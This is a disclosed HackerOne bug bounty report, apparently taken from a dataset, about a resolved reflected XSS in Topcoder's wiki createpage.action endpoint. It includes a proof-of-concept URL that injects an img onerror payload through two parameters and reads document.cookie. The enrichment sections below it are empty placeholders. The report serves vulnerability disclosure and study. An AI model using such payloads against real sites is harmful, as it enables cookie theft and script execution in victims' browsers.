---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '866576'
original_report_id: '866576'
title: Reflected XSS on https://apps.topcoder.com/wiki/pages/createpage.action
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: topcoder
created_at: '2020-05-05T16:10:56.380Z'
disclosed_at: '2020-05-12T13:47:56.085Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
asset_identifier: apps.topcoder.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS on https://apps.topcoder.com/wiki/pages/createpage.action

## Metadata

- HackerOne Report ID: 866576
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: topcoder
- Disclosed At: 2020-05-12T13:47:56.085Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Hi :) A reflected XSS occurs on https://apps.topcoder.com/wiki/pages/createpage.action when creating wiki pages.

## Steps To Reproduce:
A user can create wiki pages on https://apps.topcoder.com/wiki/pages/createpage.action?spaceKey=tcwiki. In this url `parentPageString` and `labelsString` parameters are vulnerable to XSS.

PoC:
https://apps.topcoder.com/wiki/pages/createpage.action?spaceKey=tcwiki&parentPageString=powerpuff_hackerone%22%3E%3Cimg%20src=X%20onerror=alert(document.cookie)%3E&labelsString=%22%3E%3Cimg+src%3DX+onerror%3Dalert(document.domain)%3E
{F816308}
{F816309}

## Impact

XSS can use to steal cookies or to run arbitrary code on victim's browser.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
